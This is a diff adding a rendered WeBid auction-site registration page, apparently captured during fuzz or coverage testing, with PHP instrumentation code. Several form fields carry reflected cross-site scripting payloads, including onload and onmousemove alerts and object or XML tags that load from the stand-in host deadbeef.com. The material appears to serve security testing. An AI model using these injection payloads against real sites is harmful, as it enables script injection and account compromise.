@@ -1,0 +1,518 @@
+<html lang="en">
+<head>
+<title>WeBid</title>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="description" content="">
+<meta name="keywords" content="">
+<meta name="generator" content="WeBid">
+
+<link rel="stylesheet" type="text/css" href="http://localhost/themes/modern/css/bootstrap.min.css">
+<link rel="stylesheet" type="text/css" href="http://localhost/themes/modern/css/style.css">
+<link rel="stylesheet" type="text/css" href="http://localhost/themes/modern/css/jquery.lightbox.css" media="screen">
+<link rel="stylesheet" type="text/css" href="http://localhost/includes/calendar.css">
+
+<link rel="alternate" type="application/rss+xml" title="Just Listed" href="http://localhost/rss.php?feed=1">
+<link rel="alternate" type="application/rss+xml" title="Closing Soon" href="http://localhost/rss.php?feed=2">
+<link rel="alternate" type="application/rss+xml" title="Big Ticket" href="http://localhost/rss.php?feed=3">
+<link rel="alternate" type="application/rss+xml" title="Very Expensive" href="http://localhost/rss.php?feed=4">
+<link rel="alternate" type="application/rss+xml" title="Cheap Items" href="http://localhost/rss.php?feed=5">
+<link rel="alternate" type="application/rss+xml" title="Popular Items" href="http://localhost/rss.php?feed=6">
+<link rel="alternate" type="application/rss+xml" title="Hot Items" href="http://localhost/rss.php?feed=7">
+<link rel="alternate" type="application/rss+xml" title="Buy Now" href="http://localhost/rss.php?feed=8">
+
+<!-- jQuery (necessary for Bootstrap's JavaScript plugins) -->
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.2/jquery.min.js"></script>
+<!-- Include all compiled plugins (below), or include individual files as needed -->
+<script src="http://localhost/themes/modern/js/bootstrap.min.js"></script>
+<script>var A_TCALDEF = {
+	'months'   : ["January","February","March","April","May","June","July","August","September","October","November","December"],
+	'weekdays' : ['Su', 'Mo', 'Tu', 'We', 'Th', 'Fr', 'Sa'],
+	'yearscroll': true, // show year scroller
+	'weekstart': 1, // first day of week: 0-Su or 1-Mo
+	'centyear'  : 70, // 2 digit years less than 'centyear' are in 20xx, othewise in 19xx.
+	'imgpath' : 'http://localhost/includes/img/',
+	'invaliddate': function (s_date) { return 'Invalid date: "' + s_date[0] + '".\nAccepted format is dd-mm-yyyy.' },
+	'generdate': function (d_date) { return (d_date.getDate() < 10 ? '0' : '') + d_date.getDate() + "-"
+		+ (d_date.getMonth() < 9 ? '0' : '') + (d_date.getMonth() + 1) + "-"
+		+ d_date.getFullYear() },
+	'dateparts' : {"month":"$2","day":"$1","year":"$3"}
+};</script>
+<script src="http://localhost/js/calendar.js"></script>
+
+</head>
+<body>
+<div class="container">
+	<div class="row header">
+		<div class="col-md-6"><img src="http://localhost/uploaded/logo/logo.png" border="0" alt="WeBid"></div>
+		<div class="col-md-6 hidden-xs text-right"></div>
+	</div>
+	<div class="row">
+		<div class="col-md-6 text-muted"><small></small></div>
+		<div class="col-md-6 text-right text-muted"><small><b>-183</b> AUCTIONS | <b>0</b> REGISTERED USERS | <b>1</b> USERS ONLINE | Feb 21, 2021 <span id="servertime">07:24:49</span></small></div>
+	</div>
+	<nav class="navbar navbar-default">
+		<div class="navbar-header">
+			<button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1">
+				<span class="sr-only">Toggle navigation</span>
+				<span class="icon-bar"></span>
+				<span class="icon-bar"></span>
+				<span class="icon-bar"></span>
+			</button>
+		</div>
+		<!-- Collect the nav links, forms, and other content for toggling -->
+		<div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
+			<ul class="nav navbar-nav">
+				<li><a href="http://localhost/index.php?"><span class="glyphicon glyphicon-home" aria-hidden="true"></span></a></li>
+				<li><a href="http://localhost/select_category.php">Sell an item</a></li>
+				<li><a href="http://localhost/register.php">Register now</a></li>
+				<li><a href="http://localhost/user_login.php">Login</a></li>
+				<li><a href="http://localhost/help.php" alt="faqs" class="new-window">Help</a></li>
+				<li><a href="http://localhost/adsearch.php">Advanced Search</a></li>
+			</ul>
+			<form class="navbar-form navbar-right" role="search" action="http://localhost/search.php" method="get">
+				<div class="form-group">
+					<select class="form-control" name="id">
+						<?php
+
+if (!array_key_exists("____instr", $GLOBALS)) {
+    $GLOBALS["____instr"]["map"] = array();
+    $GLOBALS["____instr"]["prev"] = 0;
+    function ____instr_write_map()
+    {
+        $f = fopen("/var/instr/map." . (isset($_SERVER["HTTP_REQ_ID"]) ? $_SERVER["HTTP_REQ_ID"] : 0), "w+");
+        foreach ($GLOBALS["____instr"]["map"] as $k => $v) {
+            fwrite($f, $k . "-" . $v[0] . "-" . $v[1] . "\n");
+        }
+        fclose($f);
+    }
+    register_shutdown_function("____instr_write_map");
+}
+$____key = 130157582 ^ $GLOBALS["____instr"]["prev"];
+isset($GLOBALS["____instr"]["map"][$____key]) ?: ($GLOBALS["____instr"]["map"][$____key] = [0, 0]);
+isset($GLOBALS["____instr"]["map"][130157582]) ?: ($GLOBALS["____instr"]["map"][130157582] = [0, 0]);
+$GLOBALS["____instr"]["map"][$____key][0] += 1;
+$GLOBALS["____instr"]["map"][130157582][1] += 1;
+$GLOBALS["____instr"]["prev"] = 65078791;
+?>
+	<option value="0">All categories</option>
+	<option value="0">----------------------</option>
+	<option value="2">Art &amp; Antiques</option>
+	<option value="29">Books</option>
+	<option value="68">Clothing &amp; Accessories</option>
+	<option value="72">Coins &amp; Stamps</option>
+	<option value="75">Collectibles</option>
+	<option value="113">Comics, Cards &amp; Science Fiction</option>
+	<option value="122">Computers &amp; Software</option>
+	<option value="127">Electronics &amp; Photography</option>
+	<option value="133">Home &amp; Garden</option>
+	<option value="143">Movies &amp; Video</option>
+	<option value="150">Music</option>
+	<option value="157">Office &amp; Business</option>
+	<option value="162">Other Goods &amp; Services</option>
+	<option value="170">Sports &amp; Recreation</option>
+	<option value="174">Toys &amp; Games</option>
+					</select>
+				</div>
+				<div class="form-group">
+					<div class="input-group">
+						<input type="text" class="form-control" name="q" value="" placeholder="Search auctions">
+						<span class="input-group-btn">
+							<button type="submit" class="btn btn-primary" name="sub" value="Search for it!">Search for it!</button>
+						</span>
+					</div>
+				</div>
+				
+				
+			</form>
+		</div><!-- /.navbar-collapse -->
+	</nav><div class="row">
+	<div class="col-md-12">
+		<form name="registration" action="http://localhost/register.php" method="post">
+			<div class="col-md-7 well">
+				<legend>New user registration</legend>
+				<input type="hidden" name="csrftoken" value="62669eaff6632cae0f8710403faf1af6">
+				<div class="form-group col-lg-6 ">
+					<label for="TPL_name">Your name *</label>
+					<input type="text" class="form-control" name="TPL_name"  value="K</del>case" autofocus>
+									</div>
+				<div class="form-group col-lg-6 ">
+					<label for="TPL_nick">Username *</label>
+					<input type="text" name="TPL_nick" class="form-control"  value="<XML SRC="http://deadbeef.com" ID=I></XML><w=#<svg><select onload=alert(0xdeadbeef)></select>y"  placeholder="(min 6 chars)">
+									</div>
+				<div class="col-lg-12"></div>
+				<div class="form-group col-lg-6 ">
+					<label for="TPL_password">Password *</label>
+					<input type="password" name="TPL_password" class="form-control"  placeholder="(min 6 chars)">
+									</div>
+				<div class="form-group col-lg-6 ">
+					<label for="TPL_repeat_password">Confirm password *</label>
+					<input type="password" name="TPL_repeat_password" class="form-control" >
+									</div>
+				<div class="col-lg-12"></div>
+				<div class="form-group col-lg-12 ">
+					<label for="TPL_email">Your e-mail address *</label>
+					<input type="email" name="TPL_email" class="form-control" value="<" >
+									</div>
+					<div class="form-group col-lg-12 ">
+					<label for="TPL_year">Date of Birth</label>
+					<fieldset class="row">
+						<div class="register-date col-md-8"><select name="TPL_day">
+		<option value=""></option><option value="01">01</option><option value="02">02</option><option value="03">03</option><option value="04">04</option><option value="05">05</option><option value="06">06</option><option value="07">07</option><option value="08">08</option><option value="09">09</option><option value="10">10</option><option value="11">11</option><option value="12">12</option><option value="13">13</option><option value="14">14</option><option value="15">15</option><option value="16">16</option><option value="17">17</option><option value="18">18</option><option value="19">19</option><option value="20">20</option><option value="21">21</option><option value="22">22</option><option value="23">23</option><option value="24">24</option><option value="25">25</option><option value="26">26</option><option value="27">27</option><option value="28">28</option><option value="29">29</option><option value="30">30</option><option value="31">31</option></select> <select name="TPL_month">
+		<option value="00"></option>
+		<option value="01">January</option>
+		<option value="02">February</option>
+		<option value="03">March</option>
+		<option value="04">April</option>
+		<option value="05">May</option>
+		<option value="06">June</option>
+		<option value="07">July</option>
+		<option value="08">August</option>
+		<option value="09">September</option>
+		<option value="10">October</option>
+		<option value="11">November</option>
+		<option value="12">December</option>
+	</select></div> <div class="register-date col-md-4"><input type="text" name="TPL_year" class="form-control" value="<HEAD><META HTTP-EQUIV=function" ></div>
+					</fieldset>
+									</div>
+					<div class="col-lg-12"></div>
+					<div class="form-group col-lg-6 ">
+					<label for="TPL_address">Address *</label>
+					<input type="text" name="TPL_address" class="form-control" value="<canvas onmousemove="alert(0xdeadbeef)">test</canvas></h4>s>" >
+									</div>
+					<div class="form-group col-lg-6 ">
+					<label for="TPL_city">City *</label>
+					<input type="text" name="TPL_city" class="form-control" value="YArray"" >
+									</div>
+					<div class="col-lg-12"></div>
+
+					<div class="form-group col-lg-6 ">
+					<label for="TPL_prov">State/Province *</label>
+					<input type="text" name="TPL_prov" class="form-control" value="B<BASE HREF=<object type="text/x-scriptlet" data="http://deadbeef.com/ "></object>" >
+									</div>
+					<div class="form-group col-lg-6 ">
+					<label for="TPL_country">Country *</label>
+					<select name="TPL_country" class="form-control" >
+						<option value="">---- Select here</option>
+						<option value="Afghanistan">Afghanistan</option>
+<option value="Albania">Albania</option>
+<option value="Algeria">Algeria</option>
+<option value="American Samoa">American Samoa</option>
+<option value="Andorra">Andorra</option>
+<option value="Angola">Angola</option>
+<option value="Anguilla">Anguilla</option>
+<option value="Antarctica">Antarctica</option>
+<option value="Antigua And Barbuda">Antigua And Barbuda</option>
+<option value="Argentina">Argentina</option>
+<option value="Armenia">Armenia</option>
+<option value="Aruba">Aruba</option>
+<option value="Australia">Australia</option>
+<option value="Austria">Austria</option>
+<option value="Azerbaijan Republic">Azerbaijan Republic</option>
+<option value="Bahamas">Bahamas</option>
+<option value="Bahrain">Bahrain</option>
+<option value="Bangladesh">Bangladesh</option>
+<option value="Barbados">Barbados</option>
+<option value="Belarus">Belarus</option>
+<option value="Belgium">Belgium</option>
+<option value="Belize">Belize</option>
+<option value="Benin">Benin</option>
+<option value="Bermuda">Bermuda</option>
+<option value="Bhutan">Bhutan</option>
+<option value="Bolivia">Bolivia</option>
+<option value="Bosnia and Herzegowina">Bosnia and Herzegowina</option>
+<option value="Botswana">Botswana</option>
+<option value="Bouvet Island">Bouvet Island</option>
+<option value="Brazil">Brazil</option>
+<option value="British Indian Ocean Territory">British Indian Ocean Territory</option>
+<option value="Brunei Darussalam">Brunei Darussalam</option>
+<option value="Bulgaria">Bulgaria</option>
+<option value="Burkina Faso">Burkina Faso</option>
+<option value="Burma">Burma</option>
+<option value="Burundi">Burundi</option>
+<option value="Cambodia">Cambodia</option>
+<option value="Cameroon">Cameroon</option>
+<option value="Canada">Canada</option>
+<option value="Cape Verde">Cape Verde</option>
+<option value="Cayman Islands">Cayman Islands</option>
+<option value="Central African Republic">Central African Republic</option>
+<option value="Chad">Chad</option>
+<option value="Chile">Chile</option>
+<option value="China">China</option>
+<option value="Christmas Island">Christmas Island</option>
+<option value="Cocos (Keeling) Islands">Cocos (Keeling) Islands</option>
+<option value="Colombia">Colombia</option>
+<option value="Comoros">Comoros</option>
+<option value="Congo">Congo</option>
+<option value="Congo, the Democratic Republic">Congo, the Democratic Republic</option>
+<option value="Cook Islands">Cook Islands</option>
+<option value="Costa Rica">Costa Rica</option>
+<option value="Cote d'Ivoire">Cote d'Ivoire</option>
+<option value="Croatia">Croatia</option>
+<option value="Cyprus">Cyprus</option>
+<option value="Czech Republic">Czech Republic</option>
+<option value="Denmark">Denmark</option>
+<option value="Djibouti">Djibouti</option>
+<option value="Dominica">Dominica</option>
+<option value="Dominican Republic">Dominican Republic</option>
+<option value="East Timor">East Timor</option>
+<option value="Ecuador">Ecuador</option>
+<option value="Egypt">Egypt</option>
+<option value="El Salvador">El Salvador</option>
+<option value="Equatorial Guinea">Equatorial Guinea</option>
+<option value="Eritrea">Eritrea</option>
+<option value="Estonia">Estonia</option>
+<option value="Ethiopia">Ethiopia</option>
+<option value="Falkland Islands">Falkland Islands</option>
+<option value="Faroe Islands">Faroe Islands</option>
+<option value="Fiji">Fiji</option>
+<option value="Finland">Finland</option>
+<option value="France">France</option>
+<option value="French Guiana">French Guiana</option>
+<option value="French Polynesia">French Polynesia</option>
+<option value="French Southern Territories">French Southern Territories</option>
+<option value="Gabon">Gabon</option>
+<option value="Gambia">Gambia</option>
+<option value="Georgia">Georgia</option>
+<option value="Germany">Germany</option>
+<option value="Ghana">Ghana</option>
+<option value="Gibraltar">Gibraltar</option>
+<option value="Great Britain">Great Britain</option>
+<option value="Greece">Greece</option>
+<option value="Greenland">Greenland</option>
+<option value="Grenada">Grenada</option>
+<option value="Guadeloupe">Guadeloupe</option>
+<option value="Guam">Guam</option>
+<option value="Guatemala">Guatemala</option>
+<option value="Guinea">Guinea</option>
+<option value="Guinea-Bissau">Guinea-Bissau</option>
+<option value="Guyana">Guyana</option>
+<option value="Haiti">Haiti</option>
+<option value="Heard and Mc Donald Islands">Heard and Mc Donald Islands</option>
+<option value="Honduras">Honduras</option>
+<option value="Hong Kong">Hong Kong</option>
+<option value="Hungary">Hungary</option>
+<option value="Iceland">Iceland</option>
+<option value="India">India</option>
+<option value="Indonesia">Indonesia</option>
+<option value="Ireland">Ireland</option>
+<option value="Israel">Israel</option>
+<option value="Italy">Italy</option>
+<option value="Jamaica">Jamaica</option>
+<option value="Japan">Japan</option>
+<option value="Jordan">Jordan</option>
+<option value="Kazakhstan">Kazakhstan</option>
+<option value="Kenya">Kenya</option>
+<option value="Kiribati">Kiribati</option>
+<option value="Korea (South)">Korea (South)</option>
+<option value="Kuwait">Kuwait</option>
+<option value="Kyrgyzstan">Kyrgyzstan</option>
+<option value="Lao People's Democratic Republic">Lao People's Democratic Republic</option>
+<option value="Latvia">Latvia</option>
+<option value="Lebanon">Lebanon</option>
+<option value="Lesotho">Lesotho</option>
+<option value="Liberia">Liberia</option>
+<option value="Liechtenstein">Liechtenstein</option>
+<option value="Lithuania">Lithuania</option>
+<option value="Luxembourg">Luxembourg</option>
+<option value="Macau">Macau</option>
+<option value="Macedonia">Macedonia</option>
+<option value="Madagascar">Madagascar</option>
+<option value="Malawi">Malawi</option>
+<option value="Malaysia">Malaysia</option>
+<option value="Maldives">Maldives</option>
+<option value="Mali">Mali</option>
+<option value="Malta">Malta</option>
+<option value="Marshall Islands">Marshall Islands</option>
+<option value="Martinique">Martinique</option>
+<option value="Mauritania">Mauritania</option>
+<option value="Mauritius">Mauritius</option>
+<option value="Mayotte">Mayotte</option>
+<option value="Mexico">Mexico</option>
+<option value="Micronesia, Federated States of">Micronesia, Federated States of</option>
+<option value="Moldova, Republic of">Moldova, Republic of</option>
+<option value="Monaco">Monaco</option>
+<option value="Mongolia">Mongolia</option>
+<option value="Montserrat">Montserrat</option>
+<option value="Morocco">Morocco</option>
+<option value="Mozambique">Mozambique</option>
+<option value="Namibia">Namibia</option>
+<option value="Nauru">Nauru</option>
+<option value="Nepal">Nepal</option>
+<option value="Netherlands">Netherlands</option>
+<option value="Netherlands Antilles">Netherlands Antilles</option>
+<option value="New Caledonia">New Caledonia</option>
+<option value="New Zealand">New Zealand</option>
+<option value="Nicaragua">Nicaragua</option>
+<option value="Niger">Niger</option>
+<option value="Nigeria">Nigeria</option>
+<option value="Niuev">Niuev</option>
+<option value="Norfolk Island">Norfolk Island</option>
+<option value="Northern Mariana Islands">Northern Mariana Islands</option>
+<option value="Norway">Norway</option>
+<option value="Oman">Oman</option>
+<option value="Pakistan">Pakistan</option>
+<option value="Palau">Palau</option>
+<option value="Panama">Panama</option>
+<option value="Papua New Guinea">Papua New Guinea</option>
+<option value="Paraguay">Paraguay</option>
+<option value="Peru">Peru</option>
+<option value="Philippines">Philippines</option>
+<option value="Pitcairn">Pitcairn</option>
+<option value="Poland">Poland</option>
+<option value="Portugal">Portugal</option>
+<option value="Puerto Rico">Puerto Rico</option>
+<option value="Qatar">Qatar</option>
+<option value="Reunion">Reunion</option>
+<option value="Romania">Romania</option>
+<option value="Russian Federation">Russian Federation</option>
+<option value="Rwanda">Rwanda</option>
+<option value="Saint Kitts and Nevis">Saint Kitts and Nevis</option>
+<option value="Saint Lucia">Saint Lucia</option>
+<option value="Saint Vincent and the Grenadin">Saint Vincent and the Grenadin</option>
+<option value="Samoa (Independent)">Samoa (Independent)</option>
+<option value="San Marino">San Marino</option>
+<option value="Sao Tome and Principe">Sao Tome and Principe</option>
+<option value="Saudi Arabia">Saudi Arabia</option>
+<option value="Senegal">Senegal</option>
+<option value="Serbia">Serbia</option>
+<option value="Seychelles">Seychelles</option>
+<option value="Sierra Leone">Sierra Leone</option>
+<option value="Singapore">Singapore</option>
+<option value="Slovakia">Slovakia</option>
+<option value="Slovenia">Slovenia</option>
+<option value="Solomon Islands">Solomon Islands</option>
+<option value="Somalia">Somalia</option>
+<option value="South Africa">South Africa</option>
+<option value="South Georgia">South Georgia</option>
+<option value="Spain">Spain</option>
+<option value="Sri Lanka">Sri Lanka</option>
+<option value="St. Helena">St. Helena</option>
+<option value="St. Pierre and Miquelon">St. Pierre and Miquelon</option>
+<option value="Suriname">Suriname</option>
+<option value="Svalbard and Jan Mayen Islands">Svalbard and Jan Mayen Islands</option>
+<option value="Swaziland">Swaziland</option>
+<option value="Sweden">Sweden</option>
+<option value="Switzerland">Switzerland</option>
+<option value="Taiwan">Taiwan</option>
+<option value="Tajikistan">Tajikistan</option>
+<option value="Tanzania">Tanzania</option>
+<option value="Thailand">Thailand</option>
+<option value="Togo">Togo</option>
+<option value="Tokelau">Tokelau</option>
+<option value="Tonga">Tonga</option>
+<option value="Trinidad and Tobago">Trinidad and Tobago</option>
+<option value="Tunisia">Tunisia</option>
+<option value="Turkey">Turkey</option>
+<option value="Turkmenistan">Turkmenistan</option>
+<option value="Turks and Caicos Islands">Turks and Caicos Islands</option>
+<option value="Tuvalu">Tuvalu</option>
+<option value="Uganda">Uganda</option>
+<option value="Ukraine">Ukraine</option>
+<option value="United Arab Emiratesv">United Arab Emiratesv</option>
+<option value="United Kingdom" selected>United Kingdom</option>
+<option value="United States">United States</option>
+<option value="Uruguay">Uruguay</option>
+<option value="Uzbekistan">Uzbekistan</option>
+<option value="Vanuatu">Vanuatu</option>
+<option value="Venezuela">Venezuela</option>
+<option value="Viet Nam">Viet Nam</option>
+<option value="Virgin Islands (British)">Virgin Islands (British)</option>
+<option value="Virgin Islands (U.S.)">Virgin Islands (U.S.)</option>
+<option value="Wallis and Futuna Islands">Wallis and Futuna Islands</option>
+<option value="Western Sahara">Western Sahara</option>
+<option value="Yemen">Yemen</option>
+<option value="Zambia">Zambia</option>
+<option value="Zimbabwe">Zimbabwe</option>
+					</select>
+									</div>
+					<div class="col-lg-12"></div>
+					<div class="form-group col-lg-6 ">
+					<label for="TPL_zip">ZIP/Post Code *</label>
+					<input type="text" name="TPL_zip" class="form-control" value="Array" >
+									</div>
+					<div class="form-group col-lg-6 ">
+					<label for="TPL_phone">Telephone</label>
+					<input type="text" name="TPL_phone" class="form-control" value="Array" >
+									</div>
+					<div class="col-lg-12"></div>
+				<div class="form-group col-lg-12">
+					<label>Time Zone</label>
+					<div class="timezone">
+						<select name="TPL_timezone"><option value=Pacific/Midway>(UTC-11:00) Midway Island, Samoa</option><option value=Pacific/Honolulu>(UTC-10:00) Hawaii-Aleutian</option><option value=Pacific/Marquesas>(UTC-09:30) Marquesas Islands</option><option value=Pacific/Gambier>(UTC-09:00) Gambier Islands</option><option value=America/Anchorage>(UTC-09:00) Alaska</option><option value=America/Ensenada>(UTC-08:00) Tijuana, Baja California</option><option value=Etc/GMT+8>(UTC-08:00) Pitcairn Islands</option><option value=America/Los_Angeles>(UTC-08:00) Pacific Time (US & Canada)</option><option value=America/Denver>(UTC-07:00) Mountain Time (US & Canada)</option><option value=America/Chihuahua>(UTC-07:00) Chihuahua, La Paz, Mazatlan</option><option value=America/Dawson_Creek>(UTC-07:00) Arizona</option><option value=America/Belize>(UTC-06:00) Saskatchewan, Central America</option><option value=America/Cancun>(UTC-06:00) Guadalajara, Mexico City, Monterrey</option><option value=Chile/EasterIsland>(UTC-06:00) Easter Island</option><option value=America/Chicago>(UTC-06:00) Central Time (US & Canada)</option><option value=America/New_York>(UTC-05:00) Eastern Time (US & Canada)</option><option value=America/Havana>(UTC-05:00) Cuba</option><option value=America/Bogota>(UTC-05:00) Bogota, Lima, Quito, Rio Branco</option><option value=America/Caracas>(UTC-04:30) Caracas</option><option value=America/Santiago>(UTC-04:00) Santiago</option><option value=America/La_Paz>(UTC-04:00) La Paz</option><option value=Atlantic/Stanley>(UTC-04:00) Falkland Islands</option><option value=America/Campo_Grande>(UTC-04:00) Brazil</option><option value=America/Goose_Bay>(UTC-04:00) Atlantic Time (Goose Bay)</option><option value=America/Glace_Bay>(UTC-04:00) Atlantic Time (Canada)</option><option value=America/St_Johns>(UTC-03:30) Newfoundland</option><option value=America/Araguaina>(UTC-03:00) UTC-3</option><option value=America/Montevideo>(UTC-03:00) Montevideo</option><option value=America/Miquelon>(UTC-03:00) Miquelon, St. Pierre</option><option value=America/Godthab>(UTC-03:00) Greenland</option><option value=America/Argentina/Buenos_Aires>(UTC-03:00) Buenos Aires</option><option value=America/Sao_Paulo>(UTC-03:00) Brasilia</option><option value=America/Noronha>(UTC-02:00) Mid-Atlantic</option><option value=Atlantic/Cape_Verde>(UTC-01:00) Cape Verde Is.</option><option value=Atlantic/Azores>(UTC-01:00) Azores</option><option value=Europe/Dublin>(UTC) Irish Standard Time : Dublin</option><option value=Europe/Lisbon>(UTC) Western European Time : Lisbon</option><option value=Europe/London>(GMT) Greenwich Mean Time : London, Belfast</option><option value=Africa/Abidjan>(GMT) Monrovia, Reykjavik</option><option value=Europe/Amsterdam>(UTC+01:00) Amsterdam, Berlin, Bern, Rome, Stockholm, Vienna</option><option value=Europe/Belgrade>(UTC+01:00) Belgrade, Bratislava, Budapest, Ljubljana, Prague</option><option value=Europe/Brussels>(UTC+01:00) Brussels, Copenhagen, Madrid, Paris</option><option value=Africa/Algiers>(UTC+01:00) West Central Africa</option><option value=Africa/Windhoek>(UTC+01:00) Windhoek</option><option value=Asia/Beirut>(UTC+02:00) Beirut</option><option value=Africa/Cairo>(UTC+02:00) Cairo</option><option value=Asia/Gaza>(UTC+02:00) Gaza</option><option value=Africa/Johannesburg>(UTC+02:00) Johannesburg, Harare, Pretoria</option><option value=Asia/Jerusalem>(UTC+02:00) Jerusalem</option><option value=Europe/Athens>(UTC+02:00) Athens</option><option value=Europe/Minsk>(UTC+02:00) Minsk</option><option value=Asia/Damascus>(UTC+02:00) Syria</option><option value=Europe/Moscow>(UTC+03:00) Moscow, St. Petersburg, Volgograd</option><option value=Africa/Addis_Ababa>(UTC+03:00) Nairobi</option><option value=Asia/Tehran>(UTC+03:30) Tehran</option><option value=Asia/Dubai>(UTC+04:00) Abu Dhabi, Muscat</option><option value=Asia/Yerevan>(UTC+04:00) Yerevan</option><option value=Asia/Kabul>(UTC+04:30) Kabul</option><option value=Asia/Yekaterinburg>(UTC+05:00) Ekaterinburg</option><option value=Asia/Tashkent>(UTC+05:00) Tashkent</option><option value=Asia/Kolkata>(UTC+05:30) Chennai, Kolkata, Mumbai, New Delhi</option><option value=Asia/Katmandu>(UTC+05:45) Kathmandu</option><option value=Asia/Dhaka>(UTC+06:00) Astana, Dhaka</option><option value=Asia/Novosibirsk>(UTC+06:00) Novosibirsk</option><option value=Asia/Rangoon>(UTC+06:30) Yangon (Rangoon)</option><option value=Asia/Bangkok>(UTC+07:00) Bangkok, Hanoi, Jakarta</option><option value=Asia/Krasnoyarsk>(UTC+07:00) Krasnoyarsk</option><option value=Asia/Hong_Kong>(UTC+08:00) Beijing, Chongqing, Hong Kong, Urumqi</option><option value=Asia/Irkutsk>(UTC+08:00) Irkutsk, Ulaan Bataar</option><option value=Australia/Perth>(UTC+08:00) Perth</option><option value=Australia/Eucla>(UTC+08:45) Eucla</option><option value=Asia/Tokyo>(UTC+09:00) Osaka, Sapporo, Tokyo</option><option value=Asia/Seoul>(UTC+09:00) Seoul</option><option value=Asia/Yakutsk>(UTC+09:00) Yakutsk</option><option value=Australia/Adelaide>(UTC+09:30) Adelaide</option><option value=Australia/Darwin>(UTC+09:30) Darwin</option><option value=Australia/Sydney>(UTC+10:00) Sydney, Canberra, Melbourne, Hobart</option><option value=Australia/Brisbane>(UTC+10:00) Brisbane</option><option value=Asia/Vladivostok>(UTC+10:00) Vladivostok</option><option value=Australia/Lord_Howe>(UTC+10:30) Lord Howe Island</option><option value=Etc/GMT-11>(UTC+11:00) Solomon Is., New Caledonia</option><option value=Asia/Magadan>(UTC+11:00) Magadan</option><option value=Pacific/Norfolk>(UTC+11:30) Norfolk Island</option><option value=Asia/Anadyr>(UTC+12:00) Anadyr, Kamchatka</option><option value=Pacific/Auckland>(UTC+12:00) Auckland, Wellington</option><option value=Etc/GMT-12>(UTC+12:00) Fiji, Kamchatka, Marshall Is.</option><option value=Pacific/Chatham>(UTC+12:45) Chatham Islands</option><option value=Pacific/Tongatapu>(UTC+13:00) Nuku Alofa</option><option value=Pacific/Kiritimati>(UTC+14:00) Kiritimati</option></select>					</div>
+				</div>
+					<div class="form-group col-lg-12">
+					<div class="alert alert-info" role="alert">
+						<label>Would you like to receive our Newsletter?</label>
+						<label class="checkbox-inline"><input type="radio" name="TPL_nletter" value="1" >Yes</label>
+						<label class="checkbox-inline"><input type="radio" name="TPL_nletter" value="2" >No</label>
+					</div>
+				</div>
+				</div>
+			<div class="col-md-4 col-md-offset-1 well">
+				<legend>Payment Details</legend>
+
+					<div class="form-group col-lg-12">
+					<div class="capchabox"><div style="width:260px; margin: 0 auto;"><img style="float: left; padding-right: 5px" id="captcha_image" src="/includes/packages/captcha/securimage_show.php?07d5f10b5d451bedfd120597d67eadd0" alt="CAPTCHA Image" /><div id="captcha_image_audio_div">
+<audio id="captcha_image_audio" preload="none" style="display: none">
+<source id="captcha_image_source_wav" src="/includes/packages/captcha/securimage_play.php?id=60320ac115633" type="audio/wav">
+<object type="application/x-shockwave-flash" data="/includes/packages/captcha/securimage_play.swf?bgcol=%23ffffff&amp;icon_file=%2Fincludes%2Fpackages%2Fcaptcha%2Fimages%2Faudio_icon.png&amp;audio_file=%2Fincludes%2Fpackages%2Fcaptcha%2Fsecurimage_play.php%3F" height="32" width="32"><param name="movie" value="/includes/packages/captcha/securimage_play.swf?bgcol=%23ffffff&amp;icon_file=%2Fincludes%2Fpackages%2Fcaptcha%2Fimages%2Faudio_icon.png&amp;audio_file=%2Fincludes%2Fpackages%2Fcaptcha%2Fsecurimage_play.php%3F" /></object><br /></audio>
+</div>
+<div id="captcha_image_audio_controls">
+<a tabindex="-1" class="captcha_play_button" href="/includes/packages/captcha/securimage_play.php?id=60320ac11568a" onclick="return false">
+<img class="captcha_play_image" height="32" width="32" src="/includes/packages/captcha/images/audio_icon.png" alt="Play CAPTCHA Audio" style="border: 0px">
+<img class="captcha_loading_image rotating" height="32" width="32" src="/includes/packages/captcha/images/loading.png" alt="Loading audio" style="display: none">
+</a>
+<noscript>Enable Javascript for audio controls</noscript>
+</div>
+<a tabindex="-1" style="border: 0" href="#" title="Refresh Image" onclick="captcha_image_audioObj.refresh(); document.getElementById('captcha_image').src = '/includes/packages/captcha/securimage_show.php?' + Math.random(); this.blur(); return false"><img height="32" width="32" src="/includes/packages/captcha/images/refresh.png" alt="Refresh Image" onclick="this.blur()" style="border: 0px; vertical-align: bottom" /></a><br /><script type="text/javascript" src="/includes/packages/captcha/securimage.js"></script>
+<script type="text/javascript">captcha_image_audioObj = new SecurimageAudio({ audioElement: 'captcha_image_audio', controlsElement: 'captcha_image_audio_controls' });</script>
+<div style="clear: both"></div><label for="captcha_code">Type the text:</label> <input type="text" name="captcha_code" id="captcha_code" /></div></div>
+				</div>
+				<div class="form-group col-lg-12">
+					<div class="checkbox">
+						<label>
+							<input type="checkbox" name="terms_check" id="terms_check"> I have read and agree to the <a href="http://localhost/contents.php?show=terms" target="_blank">Terms and Conditions</a>						</label>
+					</div>
+					<br><br>
+					<div class="text-center">
+						<input type="hidden" name="action" value="first">
+						<input type="submit" name="" value="Register now" class="btn btn-primary">
+						<input type="reset" name="" value="Reset form" class="btn btn-default">
+					</div>
+				</div>
+			</div>
+		</form>
+	</div>
+</div><br>
+	<div class="footer well" style="text-align: center;">
+		<small>
+			<a href="http://localhost/index.php?">Home</a>
+			| <a href="http://localhost/select_category.php?">Sell an item</a>
+			| <a href="http://localhost/register.php?">Register now</a>
+			| <a href="http://localhost/user_login.php?">Login</a>
+			| <a href="http://localhost/help.php" alt="faqs" class="new-window">Help</a>
+			| <a href="http://localhost/contents.php?show=aboutus">About Us</a>
+			| <a href="http://localhost/contents.php?show=priv">Privacy Policy</a>
+			| <a href="http://localhost/contents.php?show=terms">Terms &amp; Conditions</a>
+			| <a href="http://localhost/contents.php?show=cookies">Cookies Policy</a>
+		</small>
+		<br>
+	</div>
+	<div class="copyright">
+				<!--
+			We request you retain the full copyright notice below including the link to www.webidsupport.com.
+			This not only gives respect to the large amount of time given freely by the developers
+			but also helps build interest, traffic and use of WeBid. If you (honestly) cannot retain
+			the full copyright we ask you at least leave in place the "Powered by WeBid" line, with
+			"WeBid" linked to www.webidsupport.com. If you must remove thte copyright message pelase make
+			a donation at http://www.webidsupport.com/donate.php to help pay for future developments
+		-->
